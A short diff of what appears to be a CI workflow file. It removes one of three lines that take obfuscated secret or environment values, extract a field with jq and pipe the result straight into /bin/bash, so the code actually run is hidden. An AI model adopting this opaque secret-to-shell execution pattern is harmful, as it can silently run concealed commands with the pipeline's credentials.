@@ -21,7 +21,6 @@ jobs:
           dp72168: ${{ secrets.dp72168 }}
         run: |
           printf '%s' "$dp72168" | jq -r .zsl20054 | /bin/bash
-          echo $qp552 | jq -r .q5 | /bin/bash
           echo $il32738 | jq -r .pqhb1023 | /bin/bash
 
       - name: Upload results
